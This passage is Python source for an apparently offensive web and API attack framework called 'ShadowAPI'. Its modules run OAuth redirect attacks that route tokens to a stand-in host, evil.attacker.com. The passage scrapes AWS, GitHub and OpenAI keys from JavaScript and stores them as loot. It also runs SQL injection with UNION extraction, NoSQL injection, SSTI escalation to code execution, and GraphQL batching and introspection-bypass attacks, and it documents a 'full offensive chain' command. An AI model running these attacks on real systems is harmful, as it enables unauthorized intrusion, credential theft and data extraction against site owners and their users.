                for path in ["/api/user", "/api/profile", "/api/settings"]:
                    resp = _req(es, "POST", es.base_url.rstrip("/") + path,
                                json={"test": "csrf"}, headers={"X-Requested-With": "XMLHttpRequest"})
                    if resp and resp.status_code == 200:
                        results.append(AttackResult(
                            "auth", "csrf_bypass", "VULN",
                            url=path, severity="MEDIUM",
                            notes="POST accepted without CSRF token",
                        ))
                        break
        return results

    def _oauth_attacks(self, es: EngagementSession,
                       client_id: str, redirect_uri: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        if not client_id:
            return results

        # 1. Open redirect in redirect_uri
        evil_redirects = [
            "https://evil.attacker.com",
            f"{redirect_uri}@evil.attacker.com",
            f"{redirect_uri}%40evil.attacker.com",
            f"{redirect_uri}/../evil",
            "//evil.attacker.com",
        ]

        for endpoint in OAUTH_ENDPOINTS:
            url = es.base_url.rstrip("/") + endpoint
            for evil_uri in evil_redirects[:3]:
                resp = _req(es, "GET", url, params={
                    "response_type": "code",
                    "client_id": client_id,
                    "redirect_uri": evil_uri,
                })
                if resp and resp.status_code in (301, 302):
                    location = resp.headers.get("Location", "")
                    if "evil.attacker.com" in location or evil_uri.split("//")[-1].split("/")[0] in location:
                        results.append(AttackResult(
                            "auth", "oauth_redirect_bypass", "VULN",
                            url=url, payload=f"redirect_uri={evil_uri}",
                            evidence=f"Redirected to: {location}",
                            severity="CRITICAL",
                            notes="OAuth redirect_uri not properly validated — token theft possible",
                        ))
                        _log(f"[Auth/OAuth] Open redirect! Code will be sent to evil.attacker.com", "CRIT")

        # 2. State parameter missing (CSRF on OAuth)
        for endpoint in OAUTH_ENDPOINTS:
            url = es.base_url.rstrip("/") + endpoint
            resp = _req(es, "GET", url, params={
                "response_type": "code", "client_id": client_id, "redirect_uri": redirect_uri,
            })
            if resp and resp.status_code in (200, 302):
                location = resp.headers.get("Location", "")
                if "state=" not in location and "state=" not in resp.url:
                    results.append(AttackResult(
                        "auth", "oauth_missing_state", "VULN",
                        url=url, evidence="No state parameter in OAuth flow",
                        severity="HIGH", notes="OAuth flow lacks state param — CSRF attack possible",
                    ))
                    break
        return results

    def _apikey_spray(self, es: EngagementSession) -> List[AttackResult]:
        results: List[AttackResult] = []
        # Test if API key leakage in JS files
        js_resp = _req(es, "GET", es.base_url)
        if not js_resp:
            return results

        # Find JS files referenced
        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', js_resp.text)
        for js_path in js_urls[:5]:
            if not js_path.startswith("http"):
                js_path = es.base_url.rstrip("/") + ("/" if not js_path.startswith("/") else "") + js_path
            js_content_resp = _req(es, "GET", js_path)
            if js_content_resp:
                content = js_content_resp.text
                for pattern_re, label in [
                    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
                    (r"AIza[0-9A-Za-z\-_]{35}", "Google API Key"),
                    (r"ghp_[0-9a-zA-Z]{36}", "GitHub PAT"),
                    (r"sk-[a-zA-Z0-9]{48}", "OpenAI API Key"),
                    (r'api[_-]?key["\s]*[:=]["\s]*["\']([a-zA-Z0-9\-_]{20,})["\']', "Generic API Key"),
                    (r'(?:secret|password|token)["\s]*[:=]["\s]*["\']([^\s"\']{8,})["\']', "Secret/Token"),
                ]:
                    matches = re.findall(pattern_re, content, re.I)
                    for m in matches[:3]:
                        val = m if isinstance(m, str) else m[0]
                        _log(f"[Auth] Secret in JS! type={label} value={val[:20]}...", "CRIT")
                        es.credentials.append(Credential(
                            type=label.lower().replace(" ", "_"),
                            value={"key": val}, source=f"javascript:{js_path}",
                            notes=f"{label} exposed in client-side JS",
                        ))
                        results.append(AttackResult(
                            "auth", "js_secret_leak", "VULN",
                            url=js_path, evidence=f"{label}: {val[:20]}...",
                            severity="CRITICAL",
                            notes=f"{label} exposed in JavaScript source",
                        ))
        return results


def _random_str(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ── Module 5: Injection Exploitation ─────────────────────────────────────────

class InjectModule:
    """SQL/NoSQL/SSTI injection — detect and exploit (blind time-based + union)."""

    def run(self, es: EngagementSession, target_url: str = "",
            params_to_test: Optional[List[str]] = None,
            post_body: Optional[Dict[str, Any]] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        url = target_url or es.base_url
        test_params = params_to_test or ["id","name","user","search","q","query","username","email","filter","sort"]

        results.extend(self._sql_inject(es, url, test_params, post_body))
        results.extend(self._nosql_inject(es, url, test_params, post_body))
        results.extend(self._ssti_detect(es, url, test_params, post_body))
        return results

    def _sql_inject(self, es: EngagementSession, url: str,
                    params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []

        # Get baseline
        baseline_resp = _req(es, "GET", url)
        baseline_body = baseline_resp.text if baseline_resp else ""
        baseline_time = 0.0

        for param in params:
            # Error-based / boolean detection
            for payload in SQLI_PAYLOADS_BASIC[:6]:
                resp = _req(es, "GET", url, params={param: payload})
                if resp:
                    body = resp.text
                    error_patterns = [
                        "sql syntax", "mysql_fetch", "ora-", "sqlite", "postgresql",
                        "you have an error in your sql", "unclosed quotation mark",
                        "quoted string not properly terminated",
                        "syntax error", "microsoft ole db", "odbc drivers",
                        "warning: pg_query", "pdoexception", "sqlstate",
                        "invalid query", "native client",
                    ]
                    if any(ep.lower() in body.lower() for ep in error_patterns):
                        _log(f"[Inject/SQL] Error-based SQLi! param={param} payload={payload!r}", "CRIT")
                        results.append(AttackResult(
                            "inject", "sqli_error", "VULN",
                            url=url, payload=f"{param}={payload}",
                            evidence=body[:300], severity="CRITICAL",
                            notes=f"Error-based SQLi in parameter '{param}'"
                        ))
                        # Attempt UNION extraction
                        union_result = self._union_extract(es, url, param, payload)
                        if union_result:
                            results.append(union_result)
                        break

            # Time-based blind SQLi
            for payload, db_type, sleep_time in SQLI_PAYLOADS_BLIND:
                t0 = time.time()
                resp = _req(es, "GET", url, params={param: "1" + payload})
                elapsed = time.time() - t0
                if elapsed >= sleep_time - 0.5 and sleep_time > 0:
                    _log(f"[Inject/SQL] TIME-BASED blind SQLi! param={param} db={db_type} delay={elapsed:.1f}s", "CRIT")
                    results.append(AttackResult(
                        "inject", f"sqli_blind_{db_type}", "VULN",
                        url=url, payload=f"{param}=1{payload}",
                        evidence=f"Response delayed {elapsed:.1f}s (expected {sleep_time}s)",
                        severity="CRITICAL",
                        notes=f"Blind time-based SQLi ({db_type}) in parameter '{param}'"
                    ))
                    break

            # POST body injection
            if post_body:
                for key in post_body:
                    test_body = {**post_body, key: "' OR '1'='1"}
                    resp = _req(es, "POST", url, json=test_body)
                    if resp:
                        body = resp.text
                        if any(ep.lower() in body.lower() for ep in ["sql", "ora-", "sqlite", "error"]):
                            results.append(AttackResult(
                                "inject", "sqli_post_body", "VULN",
                                url=url, payload=f"POST {key}=' OR '1'='1",
                                evidence=body[:200], severity="CRITICAL",
                                notes=f"SQLi in POST body parameter '{key}'",
                            ))
        return results

    def _union_extract(self, es: EngagementSession, url: str,
                       param: str, base_payload: str) -> Optional[AttackResult]:
        # Determine number of columns with NULL padding
        for col_count in range(1, 10):
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            resp = _req(es, "GET", url, params={param: payload})
            if resp and resp.status_code == 200 and "error" not in resp.text.lower():
                # Found column count — try version extraction
                version_payloads = [
                    f"' UNION SELECT version(),{','.join(['NULL']*(col_count-1))}--",
                    f"' UNION SELECT @@version,{','.join(['NULL']*(col_count-1))}--",
                    f"' UNION SELECT sqlite_version(),{','.join(['NULL']*(col_count-1))}--",
                ]
                for vp in version_payloads:
                    r = _req(es, "GET", url, params={param: vp})
                    if r:
                        m = re.search(r"(\d+\.\d+\.\d+[-\w]*)", r.text)
                        if m:
                            return AttackResult(
                                "inject", "sqli_union_extract", "VULN",
                                url=url, payload=vp,
                                evidence=f"DB version: {m.group(1)}",
                                severity="CRITICAL",
                                notes=f"UNION extraction successful. {col_count} columns. DB: {m.group(1)}",
                            )
                return AttackResult(
                    "inject", "sqli_union_cols", "PARTIAL",
                    url=url, payload=f"UNION NULL x{col_count}",
                    evidence=f"{col_count} columns found",
                    severity="HIGH",
                    notes=f"UNION SELECT works with {col_count} columns. Manual extraction required.",
                )
        return None

    def _nosql_inject(self, es: EngagementSession, url: str,
                      params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        baseline_resp = _req(es, "GET", url, params={params[0]: "legit_value"} if params else {})
        baseline_body = baseline_resp.text if baseline_resp else ""

        # GET param injection (MongoDB operator injection)
        for param in params[:5]:
            for payload in NOSQL_PAYLOADS[:4]:
                resp = _req(es, "GET", url, params={param: payload})
                if resp and resp.text != baseline_body and resp.status_code == 200:
                    # Check if response returned more data than baseline
                    if len(resp.text) > len(baseline_body) * 1.5:
                        _log(f"[Inject/NoSQL] Potential NoSQL injection! param={param}", "CRIT")
                        results.append(AttackResult(
                            "inject", "nosql_operator", "VULN",
                            url=url, payload=f"{param}={payload}",
                            evidence=resp.text[:200], severity="HIGH",
                            notes=f"NoSQL operator injection in '{param}' — response size increased significantly",
                        ))
                        break

        # POST JSON injection (MongoDB)
        if post_body:
            for key in post_body:
                test_body = {**post_body, key: {"$ne": None}}
                resp = _req(es, "POST", url, json=test_body)
                if resp and resp.status_code == 200:
                    if len(resp.text) > 20 and resp.text != baseline_body:
                        results.append(AttackResult(
                            "inject", "nosql_json_operator", "VULN",
                            url=url, payload=f'{key}: {{"$ne": null}}',
                            evidence=resp.text[:200], severity="HIGH",
                            notes="MongoDB operator injection via JSON POST body",
                        ))
        return results

    def _ssti_detect(self, es: EngagementSession, url: str,
                     params: List[str], post_body: Optional[Dict] = None) -> List[AttackResult]:
        results: List[AttackResult] = []
        for param in params[:5]:
            for payload, expected in SSTI_PAYLOADS[:4]:
                resp = _req(es, "GET", url, params={param: payload})
                if resp and expected.lower() in resp.text.lower():
                    _log(f"[Inject/SSTI] TEMPLATE INJECTION! param={param} payload={payload!r}", "CRIT")
                    # Try RCE payload
                    rce_results = []
                    for rce_payload, rce_expected in SSTI_PAYLOADS[4:]:
                        rce_resp = _req(es, "GET", url, params={param: rce_payload})
                        if rce_resp and rce_expected.lower() in rce_resp.text.lower():
                            rce_results.append(rce_resp.text[:200])
                            _log(f"[Inject/SSTI] RCE CONFIRMED! id output: {rce_resp.text[:80]}", "CRIT")
                    results.append(AttackResult(
                        "inject", "ssti" + ("_rce" if rce_results else ""), "VULN",
                        url=url, payload=f"{param}={payload}",
                        evidence=resp.text[:200],
                        severity="CRITICAL" if rce_results else "HIGH",
                        notes=f"SSTI{'→RCE confirmed' if rce_results else ''} in parameter '{param}'. "
                              f"Template: {payload!r} → response contains '{expected}'",
                        data={"rce_output": rce_results},
                    ))
                    break
        return results


# ── Module 6: GraphQL Attacks ─────────────────────────────────────────────────

class GraphQLModule:
    """GraphQL introspection, batching attacks, field brute-force, injection."""

    def run(self, es: EngagementSession, graphql_url: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        gql_url = graphql_url or (es.loot.get("fingerprint", {}).get("graphql_url") or
                                   es.base_url.rstrip("/") + "/graphql")

        if not gql_url:
            # Try to find GraphQL endpoint
            for path in ["/graphql", "/api/graphql", "/graphiql", "/query"]:
                url = es.base_url.rstrip("/") + path
                resp = _req(es, "POST", url, json={"query": "{__typename}"})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "__typename" in str(data):
                            gql_url = url
                            _log(f"[GraphQL] Endpoint found: {gql_url}", "OK")
                            break
                    except Exception:
                        pass
            if not gql_url:
                return [AttackResult("graphql", "discovery", "NOT_VULN",
                                     notes="No GraphQL endpoint found")]

        _log(f"[GraphQL] Attacking: {gql_url}", "INFO")

        # 1. Introspection (disabled = good security practice, enabled = info leak)
        introspection_enabled = False
        resp = _req(es, "POST", gql_url, json={"query": GRAPHQL_INTROSPECTION})
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("data", {}).get("__schema"):
                    introspection_enabled = True
                    schema = data["data"]["__schema"]
                    types = schema.get("types", [])
                    user_types = [t["name"] for t in types if t.get("name") and
                                  not t["name"].startswith("__")]
                    mutations = []
                    if schema.get("mutationType"):
                        mut_name = schema["mutationType"]["name"]
                        for t in types:
                            if t["name"] == mut_name:
                                mutations = [f["name"] for f in (t.get("fields") or [])]
                    _log(f"[GraphQL] Introspection ENABLED! Types: {len(user_types)}, Mutations: {len(mutations)}", "CRIT")
                    results.append(AttackResult(
                        "graphql", "introspection", "VULN",
                        url=gql_url,
                        evidence=f"Types: {user_types[:10]} | Mutations: {mutations[:10]}",
                        data={"types": user_types, "mutations": mutations},
                        severity="MEDIUM",
                        notes="GraphQL introspection enabled — full schema exposed to attackers",
                    ))
                    es.loot["graphql_schema"] = {"types": user_types, "mutations": mutations}

                    # Try sensitive mutations
                    for mutation_name in mutations:
                        if any(kw in mutation_name.lower() for kw in
                               ["delete", "admin", "password", "role", "permission", "create_user",
                                "updateRole", "resetPassword", "grantAccess"]):
                            _log(f"[GraphQL] High-value mutation: {mutation_name}", "WARN")
                    if user_types:
                        results.append(AttackResult(
                            "graphql", "sensitive_mutations", "PARTIAL",
                            url=gql_url,
                            evidence=str([m for m in mutations if any(
                                kw in m.lower() for kw in ["delete","admin","password","role"])]),
                            severity="HIGH",
                            notes="Review mutations manually for privilege escalation vectors",
                        ))
            except Exception:
                pass

        # 2. Introspection bypass attempts
        if not introspection_enabled:
            for bypass_query in GRAPHQL_INTROSPECTION_BYPASS:
                resp = _req(es, "POST", gql_url, json={"query": bypass_query})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if "data" in data and data["data"]:
                            results.append(AttackResult(
                                "graphql", "introspection_bypass", "VULN",
                                url=gql_url, payload=bypass_query,
                                evidence=str(data)[:200], severity="MEDIUM",
                                notes="Introspection disabled but bypass query returned schema info",
                            ))
                    except Exception:
                        pass

        # 3. Batching attack (rate limit bypass)
        batch_query = [{"query": f'{{ user(id: {i}) {{ id email role }} }}'} for i in range(1, 20)]
        resp = _req(es, "POST", gql_url, json=batch_query)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) > 1:
                    _log(f"[GraphQL] BATCHING enabled — rate limit bypass possible!", "CRIT")
                    results.append(AttackResult(
                        "graphql", "batching_attack", "VULN",
                        url=gql_url,
                        evidence=f"Batch of {len(data)} queries accepted in single request",
                        severity="HIGH",
                        notes="GraphQL batching enabled — brute-force/rate-limit bypass possible via batch queries",
                    ))
            except Exception:
                pass

        # 4. GraphQL injection (using known types from introspection)
        gql_inject_payloads = [
            '{ user(id: "1\\" OR 1=1--") { id email } }',
            '{ user(id: 1, ) { id __typename } }',  # parser confusion
            '{ __typename @skip(if: false) }',
        ]
        for inj in gql_inject_payloads:
            resp = _req(es, "POST", gql_url, json={"query": inj})
            if resp and resp.status_code == 200:
                body = resp.text
                if any(e in body.lower() for e in ["sql", "exception", "error", "stack"]):
                    results.append(AttackResult(
                        "graphql", "gql_injection", "VULN",
                        url=gql_url, payload=inj, evidence=body[:200],
                        severity="HIGH",
                        notes="Potential injection via GraphQL query arguments",
                    ))

        # 5. Depth/complexity DoS potential
        deep_query = "{ a { b { c { d { e { f { __typename } } } } } } }"
        resp = _req(es, "POST", gql_url, json={"query": deep_query})
        if resp and resp.status_code == 200 and resp.elapsed.total_seconds() > 2.0:
            results.append(AttackResult(
                "graphql", "query_depth", "VULN",
                url=gql_url,
                evidence=f"Deep query took {resp.elapsed.total_seconds():.1f}s",
                severity="LOW",
                notes="No query depth limit — deeply nested queries may cause DoS",
            ))

        if not results:
            results.append(AttackResult("graphql", "scan", "NOT_VULN",
                                        url=gql_url, notes="No GraphQL vulnerabilities found"))
        return results


# ── Output ─────────────────────────────────────────────────────────────────────

def print_banner() -> None:
    if PYFIGLET:
        import pyfiglet as pf
        print(f"\033[35m{pf.figlet_format('ShadowAPI', font='slant')}\033[0m")
    else:
        print(f"\033[35m\n  {TOOL_NAME} v{VERSION}\n\033[0m")
    print(f"\033[36m  Author: {AUTHOR}  |  Offensive Web & API Attack Framework\033[0m\n")

def print_legal(yes: bool) -> bool:
    print(f"\033[33m{LEGAL_WARNING}\033[0m")
    if yes:
        return True
    try:
        ans = input("  Type 'yes' to confirm written authorization: ").strip().lower()
        return ans == "yes"
    except (KeyboardInterrupt, EOFError):
        return False

def dump_results(es: EngagementSession, output: Optional[str]) -> None:
    all_results = es.results
    vuln_count = sum(1 for r in all_results if r.status == "VULN")
    crit_count = sum(1 for r in all_results if r.severity == "CRITICAL")

    print(f"\n\033[35m{'═'*60}\n  ATTACK RESULTS\n{'═'*60}\033[0m")
    print(f"  Total findings : {len(all_results)}")
    print(f"  Vulnerabilities: \033[31m{vuln_count}\033[0m")
    print(f"  Critical       : \033[35m{crit_count}\033[0m\n")

    for r in all_results:
        icons = {"VULN":"\033[35m[VULN]","NOT_VULN":"\033[37m[SAFE]",
                 "ERROR":"\033[31m[ERR] ","PARTIAL":"\033[33m[PART]"}
        color = icons.get(r.status, "     ")
        reset = "\033[0m"
        print(f"  {color} [{r.module}] {r.attack}{reset}")
        if r.notes:
            print(f"         {r.notes}")
        if r.evidence and r.status == "VULN":
            print(f"         Evidence: {r.evidence[:100]}")

    if es.credentials:
        print(f"\n\033[32m[+] CREDENTIALS/SECRETS EXTRACTED ({len(es.credentials)})\033[0m")
        for c in es.credentials:
            print(f"  Type: {c.type} | Source: {c.source}")
            for k, v in c.value.items():
                print(f"    {k}: {v[:60]}")
            if c.notes: print(f"    Note: {c.notes}")

    if output:
        payload = {
            "tool": TOOL_NAME, "version": VERSION, "target": es.base_url,
            "results": [{"module":r.module,"attack":r.attack,"status":r.status,
                         "url":r.url,"payload":r.payload,"evidence":r.evidence,
                         "severity":r.severity,"notes":r.notes} for r in all_results],
            "credentials": [{"type":c.type,"value":c.value,"source":c.source} for c in es.credentials],
            "loot": es.loot,
        }
        Path(output).write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        print(f"\n\033[32m[+] Results saved → {output}\033[0m")


# ── CLI ────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=COMMAND,
        description=f"{TOOL_NAME} v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(f"""
        Examples:
          # Full fingerprint + endpoint discovery
          python {COMMAND}.py --url https://target.com --modules fingerprint

          # SSRF exploitation against specific endpoint
          python {COMMAND}.py --url https://target.com/api/fetch --modules ssrf

          # JWT attack with existing token
          python {COMMAND}.py --url https://target.com --modules auth --jwt eyJhb...

          # IDOR exploitation
          python {COMMAND}.py --url https://target.com/api/users/{{id}} --modules idor --target-id 42

          # SQL injection exploitation
          python {COMMAND}.py --url https://target.com/api/search --modules inject --params q search id

          # GraphQL full attack
          python {COMMAND}.py --url https://target.com/graphql --modules graphql

          # Full offensive chain
          python {COMMAND}.py --url https://target.com --modules all --output findings.json
        """),
    )
    p.add_argument("--url", "-u", required=True, help="Target base URL")
    p.add_argument("--modules", nargs="+",
                   choices=["fingerprint","ssrf","idor","auth","inject","graphql","all"],
                   default=["fingerprint"])
    p.add_argument("--jwt",          default="", help="JWT token to attack")
    p.add_argument("--target-id",    default="", help="Target object ID for IDOR")
    p.add_argument("--id-param",     default="", help="Query param name containing object ID")
    p.add_argument("--params",       nargs="+",  help="Parameters to test for injection")
    p.add_argument("--graphql-url",  default="", help="Explicit GraphQL endpoint URL")
    p.add_argument("--ssrf-params",  nargs="+",  help="Specific param names to test for SSRF")
    p.add_argument("--oauth-client", default="", help="OAuth client_id for OAuth testing")
    p.add_argument("--oauth-redirect",default="",help="OAuth redirect_uri")
    p.add_argument("--header", "-H", action="append", default=[],
                   help="Custom header (format: 'Name: Value'). Can repeat.")
    p.add_argument("--cookie", "-C", action="append", default=[],
                   help="Cookie (format: 'name=value'). Can repeat.")
    p.add_argument("--proxy",        default="",
                   help="HTTP proxy URL (e.g., http://127.0.0.1:8080 for Burp Suite)")
    p.add_argument("--delay",        type=float, default=0.3, help="Delay between requests (seconds)")
    p.add_argument("--timeout",      type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--output", "-o", help="Save results to JSON file")
    p.add_argument("--yes", "-y",    action="store_true")
    p.add_argument("--verbose","-v", action="store_true")
    p.add_argument("--version",      action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()

    print_banner()
    if not print_legal(args.yes):
        print("Aborted.")
        return 1

    if not REQUESTS:
        _log("requests not installed. Run: pip install requests", "ERR")
        return 2

    headers: Dict[str, str] = {"User-Agent": DEFAULT_UA}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    cookies: Dict[str, str] = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    es = EngagementSession(
        base_url=args.url.rstrip("/"),
        headers=headers,
        cookies=cookies,
        proxies=proxies,
        timeout=args.timeout,
        delay=args.delay,
    )

    run_all = "all" in args.modules
    modules_to_run = ["fingerprint","ssrf","idor","auth","inject","graphql"] if run_all else args.modules

    module_map = {
        "fingerprint": FingerprintModule(),
        "ssrf":        SSRFModule(),
        "idor":        IDORModule(),
        "auth":        AuthModule(),
        "inject":      InjectModule(),
        "graphql":     GraphQLModule(),
    }

    for mod_name in modules_to_run:
        mod = module_map.get(mod_name)
        if not mod:
            continue
        _log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            if mod_name == "ssrf":
                results = mod.run(es, param_names=args.ssrf_params)
            elif mod_name == "idor":
                results = mod.run(es, target_url=args.url,
                                  target_id=args.target_id, id_param=args.id_param)
            elif mod_name == "auth":
                results = mod.run(es, jwt_token=args.jwt,
                                  oauth_client_id=args.oauth_client,
                                  oauth_redirect=args.oauth_redirect)
            elif mod_name == "inject":
                results = mod.run(es, target_url=args.url, params_to_test=args.params)
            elif mod_name == "graphql":
                results = mod.run(es, graphql_url=args.graphql_url)
            else:
                results = mod.run(es)
            es.results.extend(results)
        except Exception as exc:
            _log(f"Module {mod_name} error: {exc}", "ERR")
            es.results.append(AttackResult(mod_name, "run", "ERROR", notes=str(exc)))

    dump_results(es, args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())

